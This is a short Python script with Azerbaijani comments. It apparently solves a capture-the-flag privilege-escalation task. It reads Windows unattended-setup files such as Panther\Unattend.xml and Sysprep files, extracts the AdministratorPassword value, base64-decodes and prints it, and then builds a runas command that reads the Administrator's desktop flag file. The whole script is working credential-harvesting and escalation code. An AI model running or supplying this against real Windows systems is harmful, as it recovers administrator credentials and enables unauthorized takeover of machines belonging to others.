import os
import re
import base64
import subprocess

# Yoxlanılacaq potensial qovluqlar və fayllar
possible_paths = [
    r"C:\Windows\Panther\Unattend.xml",
    r"C:\Windows\Panther\Autounattend.xml",
    r"C:\Windows\System32\Sysprep\sysprep.inf",
    r"C:\Windows\System32\Sysprep\unattend.xml"
]

password = None

# Faylı axtarırıq
for path in possible_paths:
    if os.path.exists(path):
        print(f"[+] Fayl tapıldı: {path}")
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
            
            # Regex ilə AdministratorPassword teqini axtarırıq
            match = re.search(r"<AdministratorPassword>.*?<Value>(.*?)</Value>", content, re.DOTALL)
            if match:
                encoded_password = match.group(1)
                print(f"[+] Şifrələnmiş mətn: {encoded_password}")
                
                # Base64 deşifrə edirik
                try:
                    password = base64.b64decode(encoded_password).decode('utf-8')
                    print(f"[+] Deşifrə olunmuş şifrə: {password}")
                    break
                except Exception as e:
                    # Əgər base64 deyilsə, birbaşa mətni götürürük
                    password = encoded_password
                    print(f"[+] Mətn deşifrə edilə bilmədi, birbaşa götürülür: {password}")
                    break

if password:
    # İndi runas vasitəsilə Admin sessiyasında flag-i oxumağa çalışırıq
    print("[*] Admin sessiyası başladılır...")
    # Nümunə olaraq Admin Desktopundakı flag-i cmd vasitəsilə ekrana çıxarırıq
    # Qeyd: Sistemdən asılı olaraq runas əmri interaktiv şifrə istəyə bilər
    cmd = f'runas /user:Administrator "cmd.exe /c type C:\\Users\\Administrator\\Desktop\\flag.txt"'
    print(f"İcra olunacaq əmr: {cmd}")
    # runas-ı icra etmək üçün skripti işə saldıqdan sonra şifrəni əllə daxil edə bilərsən
else:
    print("[-] Şifrə tapılmadı.")
